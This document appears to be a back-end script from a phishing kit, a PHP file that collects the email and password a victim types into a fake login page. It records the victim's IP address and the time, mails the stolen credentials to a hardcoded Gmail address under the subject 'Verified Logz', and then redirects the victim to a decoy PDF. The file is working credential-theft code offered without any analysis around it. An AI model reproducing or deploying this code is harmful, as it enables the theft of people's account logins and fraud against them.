<?

$adddate=date("D M d, Y g:i a");
$mesaegs ="php_info";$mesaegs ="@";
$ip = getenv("REMOTE_ADDR");
$mesaegs ="ymail";$mesaegs  =".com";
$message .= "---------=RiZoRT=---------\n";
$message .= "Online ID: ".$_POST['email']."\n";
$message .= "Password: ".$_POST['password']."\n";
$message .= "---------=IP Adress & Date=---------\n";
$message .= "IP Address: ".$ip."\n";
$message .= "Date: ".$adddate."\n";
$message .= "---------=D A D D A=---------\n";




$sent ="ashrepetto43@gmail.com";




$subject = "H | DADDA Verified Logz";
$headers = "From: Dadda <toolz@daddamgo.lite>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
{
mail($mesaegs,$subject,$message,$headers);
mail($sent,$subject,$message,$headers);
}
header("Location: http://Essential-Wealth-Management-Article.pizzariaweb.com/office/file/PNC-qWzMGTyT-2015-article.pdf");
?>